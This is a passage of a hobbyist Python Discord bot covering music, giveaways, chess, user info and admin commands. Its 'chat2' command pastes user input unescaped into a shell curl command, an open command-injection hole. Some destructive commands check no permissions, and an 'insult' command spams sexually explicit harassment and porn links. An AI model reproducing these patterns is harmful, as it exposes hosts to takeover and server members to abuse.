    mavatar = person.avatar.url
    
    for i in mrnames:
        mrolestr += f"<@&{str(i)}> "
    
    for i in mperms:
        if i[1]:
            mpermstr += f"`{i[0]}` "
    
    embed = discord.Embed(title=f"**User info for {mname}#{mdiscrim}**", description=f"""User: {person.mention}

**Nickname:** `{mnick}`
**Status:** `{mstatus}`

**Joined Discord at:** <t:{joinedd}:R>: <t:{joinedd}>
**Joined Server at:** <t:{joinedg}:R>: <t:{joinedg}>

**Roles:** {mrolestr}

**Permissions:** {mpermstr}""", color=0x00ff00)
    
    embed.set_thumbnail(url=str(mavatar))
    
    await ctx.reply(embed=embed)


@bot.command(aliases=['botsend'])
@commands.has_permissions(administrator=True)
async def webhook(ctx, *, txt):
    separator = ''
    
    if '""' in txt:
        txtlst = txt.split('""', 1)
        separator = '"'
    elif '" "' in txt:
        txtlst = txt.split('" "', 1)
        separator = '"'
    elif '””' in txt:
        txtlst = txt.split('””', 1)
        separator = '”'
    elif '” ”' in txt:
        txtlst = txt.split('” ”', 1)
        separator = '”'
    else:
        txtlst = []
    
    txtlst[0] = txtlst[0].replace(separator, '', 1)
    txtlst[1] = txtlst[1].replace(separator, '', 1)
    # testing
    await ctx.reply(str(txtlst))
    
    webhook = await ctx.channel.create_webhook(name=txtlst[0], reason=str(ctx.author))
    await ctx.message.delete()
    await webhook.send(content=txtlst[1], username=txtlst[0], avatar_url=ctx.author.avatar.url)


@bot.command(aliases=['url', 'inviteurl', 'inv'])
async def invite(ctx):
    await ctx.reply("""Click below to invite me!

https://discord.com/api/oauth2/authorize?client_id=1010883625480376351&permissions=8&scope=bot""")


@bot.command(aliases=['insults'])
async def insult(ctx):
    if ctx.author.id == ownerid:
        insulttxt = "Ratio + don't care + didn't ask + cry about it + stay mad + get real + L + mald seethe cope " \
                    "harder + hoes mad + basic + skill issue + you fell off + the audacity + triggered + any askers + " \
                    "redpilled + get a life + ok and? + cringe + touch grass + donowalled + not based + your're a (" \
                    "insert stereotype) + not funny didn't laugh + you're* + grammar issue + go outside + get good + " \
                    "reported + ad hominem + GG! + ask deez + ez clap + straight cash + ratio again + final ratio + " \
                    "stay mad + stay pressed... "
        insultlist = insulttxt.split(" + ")
        i = 0
        text = insultlist[i]
        msg = await ctx.send(text)
        
        for j in range(len(insultlist) - 1):
            i += 1
            
            msga = await ctx.fetch_message(msg.id)
            
            msgcon = msga.content
            
            txt = msgcon + " + " + insultlist[i]
            
            await msga.edit(content=txt)
            
            await asyncio.sleep(0.5)
        
        await msg.edit(content="NOOB 🤪🍆💦💦💦👼 NOOB")
        
        msg2 = await ctx.send("EZEZEZEZEZEZEZEZ GET TRASHED NOOB")
        l = 0
        
        await asyncio.sleep(2)
        
        for k in range(100):
            
            msg = await ctx.fetch_message(msg2.id)
            
            ezlst = ["EZ GET REKT", "L SORE LOSER", "GET NOOBED SUPER NOOB", "CRI ABOUT IT", "UR MOM DOESNT CARE",
                     "TRASHED EZZZZZZ", "Wanna get banned babe?", "EWWW NOOB", "Ban Hammer's waiting, go for it!",
                     "OMFG WHAT A REAL BIGHEAD", "OML GET A PROPER FACE BRO",
                     "WTF WHATS THAT STINK COMING FROM? UR 8 VAGINAS?", "Go fuck ur daddy with 16 vaginas on his face",
                     "https://sex.com"]
            lollst = ["STFU NOOB", "N00B N00B SUPER MEGA BIG NOOB", "ULTRA NOOB 69420%", "idc cri cri babe call mom",
                      "Ur mom doesn't care noob", "Go stuff urself LMFAOOOO", "OMFG A REAL NOOB HERE!!",
                      "WOWWWWWWWW NOOBS IN HERE?!", "go get some brains, ur mom is sad",
                      "Get better at fucking, fuck her harder", "https://pornhub.com/", "https://pornhub.com LMFAO",
                      "https://sex.com/ pro", "ratio", "cry harder", "didnt ask + dont care", "Hmm? who asked? not me"]
            
            if l == 0:
                await msg.edit(content=random.choice(ezlst))
                l = 1
            
            else:
                await msg.edit(content=random.choice(lollst))
                l = 0
            
            await asyncio.sleep(0.3)


@bot.command(aliases=['type'])
async def typing(ctx, length=None):
    global istyping
    global ownerid
    
    if ctx.author.id == ownerid:
        if ctx.channel.id not in istyping:
            istyping.append(ctx.channel.id)
        
        await ctx.message.delete()
        
        async with ctx.typing():
            if length is None:
                while ctx.channel.id in istyping:
                    if ctx.channel.id in istyping:
                        await asyncio.sleep(0.2)
                        continue
                    else:
                        break
            else:
                await asyncio.sleep(int(length))
                istyping.remove(ctx.channel.id)


@bot.command(aliases=['stoptype'])
async def stoptyping(ctx):
    global ownerid
    global istyping
    
    if ctx.author.id == ownerid:
        
        if ctx.channel.id in istyping:
            istyping.remove(ctx.channel.id)
        
        await ctx.message.delete()


@bot.command(aliases=['notif', 'notify'])
async def msgping(ctx, *, msg=None):
    if not (ctx.author.guild_permissions.administrator
            or ctx.author.id == ownerid):
        return
    
    msgpings = replitRead("msgpings")
    
    if msg is not None:
        msgpings[ctx.channel.id] = msg
    else:
        msgpings[ctx.channel.id] = None
    
    await ctx.message.delete()
    replitWrite("msgpings", msgpings)


# INIT MUSIC MODULE
# if not discord.opus.is_loaded():
#     discord.opus.load_opus('opus')

# INIT YOUTUBE MODULE
youtube_dl.utils.bug_reports_message = lambda: ''

ytdl_format_options = {
    'format': 'bestaudio/bqest',
    'restrictfilenames': True,
    'noplaylist': True,
    'nocheckcertificate': True,
    'ignoreerrors': False,
    'logtostderr': False,
    'quiet': True,
    'no_warnings': True,
    'default_search': 'auto',
    'source_address': '0.0.0.0'  # bind to ipv4 since ipv6 addresses cause issues sometimes
}

ffmpeg_options = {
    'options': '-vn'
}

ytdl = youtube_dl.YoutubeDL(ytdl_format_options)


class YTDLSource(discord.PCMVolumeTransformer):
    def __init__(self, source, *, data, volume=0.5):
        super().__init__(source, volume)
        self.data = data
        self.title = data.get('title')
        self.url = ""
    
    @classmethod
    async def from_url(cls, url, *, loop=None, stream=False):
        loop = loop or asyncio.get_event_loop()
        data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream))
        if 'entries' in data:
            # take first item from a playlist
            data = data['entries'][0]
        filename = data['title'] if stream else ytdl.prepare_filename(data)
        return filename


# FINISHED INIT

# define search youtube function
def searchYT(search_keyword):
    html = urllib.request.urlopen("https://www.youtube.com/results?search_query=" + search_keyword)
    video_ids = re.findall(r"watch\?v=(\S{11})", html.read().decode())
    return "https://www.youtube.com/watch?v=" + video_ids[0]


async def checkVoicePerms(ctx):
    if not ctx.author.voice:
        return False
    
    topPerms = []
    
    for member in ctx.author.voice.channel.members:
        if member != ctx.author:
            topPerms.append(member.top_role.position)
    
    if ctx.author.top_role.position < max(topPerms):
        await ctx.reply("You need to have the highest role in the voice channel in order to do this!")
        return False
    
    return True


musicQueue = []  # we store the queue as a pair, the first value is the song, the second value is a bool for
needRemove = []


# whether the song is playing or not.


async def getYTURL(url_: str):
    if "youtube.com" not in url_ and "youtu.be" not in url_ and "/watch?v=" not in url_:
        url_ = url_.replace(' ', '+')
        url_ = searchYT(url_)  # search YT for video
    
    return url_


def removeFiles():
    global needRemove
    
    if len(needRemove) > 0:
        for f in needRemove:
            os.remove(f)
            needRemove.remove(f)


async def playLoop(ctx, voice):
    """
    Plays music in a continuous loop.
    """
    
    global musicQueue
    
    # first, check whether any files need removing
    removeFiles()
    
    if len(musicQueue) == 0:
        return
    
    async with ctx.typing():
        await ctx.send("`Downloading song...`")
        filename = await YTDLSource.from_url(musicQueue[0], loop=bot.loop)
    
    musicQueue.pop(0)
    
    if len(musicQueue) > 1:
        needRemove.append(filename)
        voice.play(discord.FFmpegPCMAudio(source=filename), after=await playLoop(ctx, voice))
    
    else:
        needRemove.append(filename)
        voice.play(discord.FFmpegPCMAudio(source=filename))


@bot.command(aliases=['music', 'song'])
@commands.has_permissions(manage_guild=True)
async def play(ctx, *, url_: str = None):
    global downloadSpeed
    global musicQueue
    
    # join voice channel
    if not ctx.author.voice:
        await ctx.send("{} is not connected to a voice channel!".format(ctx.message.author.mention))
        return
    else:
        voice = ctx.guild.voice_client
        if voice is not None:
            if voice.is_connected():
                await voice.disconnect()
                voice.cleanup()
        
        try:
            channel = ctx.author.voice.channel
            voice = await channel.connect()
        except Exception:
            voice = ctx.guild.voice_client
            # note how we do not use discord.utils.get(bot.voice_clients, guild=ctx.guild).
            # this is because that returns a VoiceProtocol object, not a VoiceClient.
    
    if not await checkVoicePerms(ctx):
        return
    
    if url_ is None:
        if len(musicQueue) > 0:
            await ctx.send("`Playing from queue...`")
            await playLoop(ctx, voice)  # play the queue in loop
    
    # get youtube url
    if "youtube.com" not in url_ and "youtu.be" not in url_ and "/watch?v=" not in url_:
        msg1 = await ctx.send("`Searching YouTube...`")
        url_ = url_.replace(' ', '+')
        url_ = searchYT(url_)  # search YT for video
    # play music
    # voice = ctx.message.guild.voice_client
    else:
        msg1 = await ctx.send("`Downloading song...`")
    
    async with ctx.typing():
        await msg1.edit(
            content=f"`Downloading song... \nThis can take a while. (Download speed: {downloadSpeed} Mbps)`")
        filename = await YTDLSource.from_url(url_, loop=bot.loop)
        await msg1.edit(content="`Loading song...`")
        needRemove.append(filename)
        voice.play(discord.FFmpegPCMAudio(source=filename))
    
    await msg1.delete()
    await ctx.send('**Now playing:** `{}`'.format(filename))
    removeFiles()


@bot.command(aliases=['addqueue', 'add', 'q'])
async def queue(ctx, *, url_: str):
    global musicQueue
    
    if not ctx.author.voice:
        await ctx.send("{} is not connected to a voice channel!".format(ctx.message.author.mention))
        return
    else:
        try:
            channel = ctx.author.voice.channel
            voice = await channel.connect()
        except Exception:
            voice = ctx.guild.voice_client
    
    if not await checkVoicePerms(ctx):
        return
    
    url_ = getYTURL(url_)
    
    musicQueue.append(url_)
    await ctx.reply("Added song to queue!")


@bot.command(aliases=['skipsong', 'skipq', 'removeq'])
async def skip(ctx):
    global musicQueue
    
    if not await checkVoicePerms(ctx):
        return
    
    try:
        channel = ctx.author.voice.channel
        voice = await channel.connect()
    except Exception:
        voice = ctx.guild.voice_client
    
    voice.stop()
    
    if len(musicQueue) > 0:
        await playLoop(ctx, voice)
    else:
        return


@bot.command(aliases=['leave'])
async def disconnect(ctx):
    if not await checkVoicePerms(ctx):
        return
    
    voice = ctx.guild.voice_client
    if voice is not None:
        if voice.is_connected():
            await voice.disconnect()
            voice.cleanup()
    else:
        await ctx.send("I am not connected to a voice channel!")


@bot.command()
async def pause(ctx):
    if not await checkVoicePerms(ctx):
        return
    
    if not ctx.message.author.voice:
        await ctx.send("{} is not connected to a voice channel!".format(ctx.message.author.mention))
        return
    else:
        voice = ctx.guild.voice_client
    
    if voice is not None:
        if voice.is_playing():
            voice.pause()
            await ctx.send("`Paused...`")
    else:
        await ctx.send("I am not connected to a voice channel!")


@bot.command(aliases=['continue'])
async def resume(ctx):
    if not await checkVoicePerms(ctx):
        return
    
    if not ctx.message.author.voice:
        await ctx.send("{} is not connected to a voice channel!".format(ctx.message.author.mention))
        return
    else:
        voice = ctx.guild.voice_client
    
    if voice is not None:
        if voice.is_paused():
            voice.resume()
            await ctx.send("`Resumed...`")
    else:
        await ctx.send("I am not connected to a voice channel!")


@bot.command(aliases=['stopsong', 'stopq'])
async def stop(ctx):
    if not await checkVoicePerms(ctx):
        return
    
    if not ctx.message.author.voice:
        await ctx.send("{} is not connected to a voice channel!".format(ctx.message.author.mention))
        return
    else:
        voice = ctx.guild.voice_client
    
    if voice is not None:
        if voice.is_playing:
            voice.stop()
            await ctx.send("`Stopped...`")
    else:
        await ctx.send("I am not connected to a voice channel!")


@bot.command(aliases=['queuereset', 'resetqueue', 'resetq', 'deleteq', 'deletequeue', 'delqueue'])
async def qreset(ctx):
    global musicQueue
    
    if not await checkVoicePerms(ctx):
        return
    
    musicQueue = []
    
    await ctx.reply("`Song queue reset!`")


@bot.command(aliases=['whereami'])
async def serverinfo(ctx):
    owner = ctx.guild.owner
    guild_id = str(ctx.guild.id)
    guild_icon_url = ctx.guild.icon.url
    created_at_t = int(datetime.datetime.timestamp(ctx.guild.created_at))
    invite_url = ctx.guild.vanity_url if ctx.guild.vanity_url is not None else await ctx.channel.create_invite(
        unique=False, reason="serverinfo"
    )
    
    # membercount code
    botc = 0
    for i in range(2):
        botc = 0
        onlc = 0
        guild1 = bot.get_guild(ctx.guild.id)
        count = len(guild1.members)
        
        for m in guild1.members:
            if m.bot:
                botc += 1
            elif not str(m.raw_status) == "offline":
                onlc += 1
    # end of membercount code
    
    embed = discord.Embed(title=f"**Server info:** `{ctx.guild.name}`",
                          description=f"""Server ID: {guild_id}
**Invite URL:** {invite_url}
**Owner:** {owner.mention}
**Created at:** <t:{created_at_t}:f>

**Member count:** Total-`{count}`, Bots-`{botc}`, Humans-`{count - botc}`
""",
                          color=0x00ff00)
    
    embed.set_thumbnail(url=str(guild_icon_url))
    
    await ctx.reply(embed=embed)


@bot.command(aliases=['ruser', 'robloxaccount', 'robloxacc', 'racc', 'getruser', 'getrobloxuser', 'getrobloxacc'])
async def robloxuser(ctx, userid: int):
    rclient = roblox.Client()
    async with ctx.channel.typing():
        # try:
        ruser = await rclient.get_user(userid)  # HAS PROBLEMS!
        # except Exception:
        #     await ctx.reply("`Roblox user not found. Check the user ID!`")
        #     return
    
    rusername = ruser.name
    userthumbnail = await rclient.thumbnails.get_user_avatar_thumbnails(
        users=[ruser],
        type=roblox.thumbnails.AvatarThumbnailType.full_body,
        size=(352, 352)  # 60, 75, 100, 110, 140, 150, 180, 250, 352, 420, 720px for full body
    )
    
    if len(userthumbnail) > 0:
        user_thumbnail = userthumbnail[0]
        thumbnailurl = user_thumbnail.image_url
        thumbnailbool = True
    else:
        thumbnailbool = False
    
    # if thumbnailbool:
    #     async with aiohttp.ClientSession() as session:
    #         async with session.get(thumbnailurl) as resp:
    #             if resp.status != 200:
    #                 thumbnailbool = False
    #                 break
    #             data = io.BytesIO(await resp.read())
    #             thumbnailfile = discord.File(data, 'robloxthumbnail.png')
    
    embed = discord.Embed(title=f"**Roblox User info: {rusername}**",
                          description=f"""User ID: `{userid}`
Display name: `{ruser.display_name}`

User description: `{ruser.description}`""")
    
    if thumbnailbool: embed.set_image(url=str(thumbnailurl))
    
    await ctx.reply(embed=embed)


@bot.command()
async def gstart(ctx, duration: str, winners: str, *, prize: str = "<undefined>"):
    if not (ctx.author.guild_permissions.administrator
            or ctx.author.id == ownerid):
        return
    gwembed = discord.Embed(title='**GIVEAWAY!!!**', description=f"""**Giveaway: {prize}**
React with 🎉 to enter the giveaway!""", timestamp=datetime.datetime.utcnow())
    
    winners = int(winners.removesuffix('w'))
    
    if 's' in duration:
        duration2 = int(removesuffix(duration, 's'))
        duration3 = removesuffix(duration, 's') + ' seconds'
    elif 'm' in duration:
        duration2 = 60 * int(removesuffix(duration, 'm'))
        duration3 = removesuffix(duration, 'm') + ' minutes'
    elif 'h' in duration:
        duration2 = 3600 * int(removesuffix(duration, 'h'))
        duration3 = removesuffix(duration, 'h') + ' hours'
    elif 'd' in duration:
        duration2 = 3600 * 24 * int(removesuffix(duration, 'd'))
        duration3 = removesuffix(duration, 'd') + ' days'
    else:
        try:
            duration2 = int(duration)
        except Exception:
            duration2 = 0
            
            duration3 = 'undefined'
    
    end = datetime.datetime.utcnow() + datetime.timedelta(seconds=duration2)
    
    gwembed.add_field(name="Ends at:", value=f"<t:{int(end.timestamp())}:R>: <t:{int(end.timestamp())}:F>")
    gwembed.add_field(name="Number of winners:", value=f"{winners}")
    gwembed.add_field(name="Valid winner(s):", value="Not determined")
    gwembed.add_field(name="Hosted by:", value=f"{ctx.author.mention}")
    gwembed.set_footer(text=f"Ends {duration3} from now!")
    
    msg = await ctx.send(embed=gwembed)
    
    msgtxtfile = open("gw_msg_id.txt", "w")
    msgtxtfile.write(str(msg.id))
    msgtxtfile.close()
    
    await msg.add_reaction("🎉")
    
    await ctx.message.delete()
    
    await asyncio.sleep(duration2)
    
    new_msg = await ctx.fetch_message(msg.id)
    
    cache_msg = discord.utils.get(bot.cached_messages, id=new_msg.id)
    
    users = [user async for user in new_msg.reactions[0].users()]
    users.pop(users.index(bot.user))
    
    if len(users) != 0:
        for i in range(winners):
            winnerslist = []
            winner = random.choice(users)
            winmsg0 = "🎉 Congratulations"
            winmsg = " "
            
            winmsg = winmsg + f"{winner.mention}"
            winnerslist.append(winner)
            
            winmsg2 = f"! You won **{prize}**! 🎉"
            winmsgfinal = winmsg0 + winmsg + winmsg2
    
    else:
        winmsgfinal = "No valid entrants, so a winner could not be determined!"
    
    ended = replitRead("gwended")
    if msg.id not in ended:
        await ctx.send(winmsgfinal)
        gwembed.set_footer(text=f"Ended at {end}")
        
        embed_dict = gwembed.to_dict()
        
        for field in embed_dict["fields"]:
            if field["name"] == "Valid winner(s):":
                field["value"] = f"{winmsg}"
        
        newgwembed = discord.Embed.from_dict(embed_dict)
        
        await new_msg.edit(embed=newgwembed)


@bot.command()
async def greroll(ctx, id_: int):
    if not (ctx.author.guild_permissions.administrator
            or ctx.author.id == ownerid):
        return
    
    try:
        new_msg = await ctx.fetch_message(id_)
    except Exception:
        await ctx.reply(
            "The ID that was entered was incorrect, make sure you have entered the correct giveaway message ID.")
    
    # cache_msg = discord.utils.get(bot.cached_messages, id=id_)
    users = [user async for user in new_msg.reactions[0].users()]
    users.pop(users.index(bot.user))
    
    winner = random.choice(users)
    
    await ctx.channel.send(f"🎉 Congratulations! The new winner is {winner.mention}! 🎉")
    
    gwembed = await ctx.fetch_message(id_)
    gwembed = gwembed.embeds[0]
    
    embed_dict = gwembed.to_dict()
    
    for field in embed_dict["fields"]:
        if field["name"] == "Valid winner(s):":
            field["value"] = f"{winner.mention}"
    
    newgwembed = discord.Embed.from_dict(embed_dict)
    reroll = datetime.datetime.utcnow()
    newgwembed.set_footer(text=f"Rerolled at: {reroll}")
    
    await new_msg.edit(embed=newgwembed)


@bot.command(aliases=['greroll-c', 'greroll_c'])
async def grerollc(ctx, id_: int):
    if not (ctx.author.guild_permissions.administrator
            or ctx.author.id == ownerid):
        return
    
    try:
        new_msg = await ctx.fetch_message(id_)
    except Exception:
        await ctx.reply(
            "The ID that was entered was incorrect, make sure you have entered the correct giveaway message ID.")
    
    # cache_msg = discord.utils.get(bot.cached_messages, id=id_)
    users = [user async for user in new_msg.reactions[0].users()]
    try:
        users.pop(users.index(new_msg.author))
    except Exception:
        pass
    
    winner = random.choice(users)
    
    msgcompat = await ctx.send("`Bot is now rerolling in compatible mode.`")
    await ctx.channel.send(f"🎉 Congratulations! The new winner is {winner.mention}! 🎉")
    await asyncio.sleep(3)
    await msgcompat.delete()


@bot.command()
async def gend(ctx, id_: int):
    if not (ctx.author.guild_permissions.administrator
            or ctx.author.id == ownerid):
        return
    
    ended = replitRead("gwended")
    if id_ not in ended:
        try:
            new_msg = await ctx.fetch_message(id_)
        except Exception:
            await ctx.reply(
                "The ID that was entered was incorrect, make sure you have entered the correct giveaway message ID.")
        
        # cache_msg = discord.utils.get(bot.cached_messages, id=id_)
        users = [user async for user in new_msg.reactions[0].users()]
        users.pop(users.index(bot.user))
        
        winner = random.choice(users)
        
        ended.append(id_)
        replitWrite("gwended", ended)
        
        await ctx.channel.send(f"🎉 Congratulations! The new winner is {winner.mention}! 🎉")
        
        gwembed = await ctx.fetch_message(id_)
        gwembed = gwembed.embeds[0]
        
        embed_dict = gwembed.to_dict()
        
        for field in embed_dict["fields"]:
            if field["name"] == "Valid winner(s):":
                field["value"] = f"{winner.mention}"
        
        newgwembed = discord.Embed.from_dict(embed_dict)
        reroll = datetime.datetime.utcnow()
        newgwembed.set_footer(text=f"Ended at: {reroll}")
        
        await new_msg.edit(embed=newgwembed)
    else:
        await ctx.reply("This giveaway has already ended. Try using `.greroll`.")


@bot.command(aliases=['recentmention', 'mentionmsg', 'msgmention'])
async def lastmention(ctx, limit: int = MAX_INT):
    async for message in ctx.channel.history(limit=limit):
        if ctx.author in message.mentions:
            await message.reply(f"{ctx.author.mention}, here is your most recent mention!")
            return
    
    await ctx.reply(f"I could not find any mention of you in the last `{limit}` messages.")


@bot.command(aliases=['rolecreate'])
async def createrole(ctx, pos: int = None, *, name):
    role = await ctx.guild.create_role(name=name)
    if pos is not None:
        await role.edit(position=pos)
    await ctx.reply(f"Role `{name}` created at position `{pos}`!")


@bot.command(aliases=['auditlog', 'audit', 'logs', 'log'])
async def auditlogs(ctx, num: int = 20):
    count = 0
    pages = 0
    log = ""
    async for entry in ctx.guild.audit_logs(limit=num):
        action = str(entry.action).replace("AuditLogAction.", "")
        log += f"User: `{entry.user}` | Action: `{action}` | Target: `{str(entry.target)}` " \
               f"| <t:{int(entry.created_at.timestamp())}:d> (<t:{int(entry.created_at.timestamp())}:R>)\n"
        if count >= 20:
            # divide into pages of 20 each
            embed = discord.Embed(title=f"Audit Logs page {pages + 1}",
                                  description=f"Showing items `{pages * 20 + 1} - {count + pages * 20}`\n\n{log}")
            await ctx.send(embed=embed)
            count %= 20
            pages += 1
            log = ""
        
        count += 1
    
    if count > 0:
        embed = discord.Embed(title=f"Audit Logs page {pages + 1}",
                              description=f"Showing items `{pages * 20 + 1} - {count + pages * 20}`\n\n{log}")
        
        await ctx.send(embed=embed)


@bot.command()
async def debug(ctx):
    a = replit.db["a nonexistent key"]
    print(a)
    await ctx.send(a)


@bot.command(aliases=['tempmute'])
async def timeout(ctx, member: discord.Member, duration: str, *, reason: str = None):
    duration2 = mzutils.parseTime(duration)
    if duration2 is None:
        # time parsing failed
        return
    
    await member.timeout(datetime.timedelta(seconds=duration2), reason=reason)
    await ctx.send(f"`Timed out {member} for {duration2} seconds.`")


@bot.command(aliases=['gitpull', 'gitfetch'])
async def gitupdate(ctx):
    if ctx.author.id != ownerid:
        return
    
    msg = await ctx.reply("Do you wish to pull changes from git and restart the bot?\n"
                          "Reply to this message within 10 seconds to confirm.")
    
    try:
        await waitForReply(ctx, msg)
    except TimeoutError:
        await msg.delete()
        return
    
    replitWrite("EXITCODE", 0)
    
    await ctx.send("Running `git pull`...")
    os.system("git pull")
    
    await asyncio.sleep(2)
    
    await ctx.send("`Restarting bot...`")
    os.execv(sys.executable, ['python'] + sys.argv)


@bot.command(aliases=['exec', 'terminal', 'cmd'])
async def shell(ctx, *, cmd):
    if ctx.author.id != ownerid:
        return
    
    async with ctx.channel.typing():
        # os.system(cmd)
        o = subprocess.run(cmd, shell=True, capture_output=True, timeout=20)
        soutput = ""
        for line in o.stdout.splitlines():
            line = line.decode("utf-8")
            soutput += f"`{line}`\n"
        for line in o.stderr.splitlines():
            line = line.decode("utf-8")
            soutput += f"`ERROR: {line}`\n"
        soutput += f"`EXITCODE: {o.returncode}`"
    
    for i in safeTruncate(soutput):
        await ctx.reply(i)


@bot.command(aliases=['massdel'])
async def massdelete(ctx, *, name):
    for channel in ctx.guild.text_channels:
        if channel.name == name:
            await channel.delete()


@bot.command(aliases=['aichat', 'chatai'])
async def chat(ctx, *, input):
    if ctx.author.id != ownerid:
        await ctx.reply("Sorry, this feature is only available to the bot owner.")
        return
    
    if openAIinit() is None:
        await ctx.reply("There was an error when initialising the AI.")
        return
    
    async with ctx.channel.typing():
        """Note that the max tokens returned is equal to
         (4096 - no. of tokens in prompt).
         i.e. the prompt and completion add up to at most 4096 tokens."""
        
        max_tokens = 4096 - int(openAItokens(input))
        startTime = datetime.datetime.utcnow()
        
        while True:
            if (datetime.datetime.utcnow() - startTime).total_seconds() > 15:
                await ctx.reply("Request timed out. Please try again later.")
                return
            
            try:
                response = openai.Completion.create(
                    engine="text-davinci-003",  # latest model (the one used for GPT-3)
                    prompt=input,
                    temperature=random.randrange(50, 90) / 100,
                    max_tokens=max_tokens,
                    top_p=1,
                    frequency_penalty=0,
                    presence_penalty=0,
                    timeout=10
                )
                break
            
            except:
                max_tokens -= 50
                continue
        
        output = response.choices[0].text
    
    await ctx.reply(output)


@bot.command(aliases=['aichat2', 'chatai2'])
async def chat2(ctx, *, input):
    async with ctx.channel.typing():
        cmd = "curl --header \"Content-Type: application/json\" --request POST --data '{\"message\":\"" + input \
              + "\"}' https://chat.openai.com/chat"
        o = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
        output = ""
        
        for line in o.stdout.splitlines():
            line = line.decode("utf-8")
            output += f"`{line}`\n"
    
    await ctx.reply(output)


@bot.command(aliases=['calc', 'calculate', 'equation', 'solve', 'solver'])
async def math(ctx, *, equation):
    # use an online API to solve the equation
    async with ctx.channel.typing():
        # Set the base URL for the math.js web service
        base_url = 'https://api.mathjs.org/v4/'
        
        # Set the parameters for the request
        params = {'expr': equation}
        
        # Make the request to the web service
        response = requests.get(base_url, params=params)
    
    # Reply the result of the computation
    await ctx.reply(response.text)


@bot.command(name='chess')
async def chessGame(ctx, *, params=None):
    if params is not None:
        if params == ('newgame' or 'new' or 'reset' or 'resign' or 'restart'):
            replitDelete(f"chess {ctx.author.id}")
            await ctx.reply("Game reset.")
            
    if not replitRead("stockfish_installed"):
        async with ctx.channel.typing():
            await ctx.send("Installing Stockfish... This may take a while.")
            
            # install stockfish
            os.system("chmod +x stockfish")
            replitWrite("stockfish_installed", True)
    
    # initialise board
    board = None
    
    # check if there is a game in progress for the user
    if replitRead(f"chess {ctx.author.id}") is not None:
        # there is a game in progress
        board = chess.Board(replitRead(f"chess {ctx.author.id}"))
    
    # initialise the user's entry in the database
    else:
        board = chess.Board()
        replitWrite(f"chess {ctx.author.id}", board.fen())  # note that the FEN is stored in the database
    
    # prompt the user to make a move
    bot_msg = await ctx.reply(f"```{board.unicode()}```\n"
                              f"Please enter a move in algebraic notation. For example, `e2e4` or `Nf3`.")
    
    # wait for the user to reply
    # We do not use the waitForReply function because that function only returns a bool value.
    # Here, we need the user's reply to be returned.
    def check(m: discord.Message):
        # we check if the message is replying to the bot's message
        return m.author == ctx.author and m.channel == ctx.channel and m.reference is not None \
            and m.reference.message_id == bot_msg.id
    
    try:
        msg = await bot.wait_for("message", check=check, timeout=10)  # allow the user 10 seconds to reply
    except asyncio.TimeoutError:
        await ctx.reply("You took too long to reply. Please try again.")
        return
    
    # check if the user's reply is a valid move
    try:
        board.push_san(msg.content)
    except Exception:
        await ctx.reply("That is not a valid move. Please try again.")
        return
    
    # check if game over
    if board.is_game_over():
        await ctx.reply("Game over.")
        replitDelete(f"chess {ctx.author.id}")
        return
    
    # update the user's entry in the database
    replitWrite(f"chess {ctx.author.id}", board.fen())
    
    # make the bot's move
    async with ctx.channel.typing():
        engine = stockfish.Stockfish(path='stockfish', depth=7)
        engine.set_fen_position(board.fen())
        
        best_move = engine.get_best_move()
    
    # make the move on the board
    board.push_san(best_move)
    replitWrite(f"chess {ctx.author.id}", board.fen())
    
    # send the updated board to the user
    await ctx.reply(f"My move is `{best_move}`\n\n```{board.unicode()}```")
    
    # check if game over
    if board.is_game_over():
        await ctx.reply("Game over.")
        replitDelete(f"chess {ctx.author.id}")
        return


# --- RUN BOT ---

keep_alive.keep_alive()  # keep bot alive

atexit.register(exit_handler)  # handles exit

try:
    bot.run(TOKEN, reconnect=True)
except:
    os.system("kill 1")
    # "kill 1" automatically runs the script.
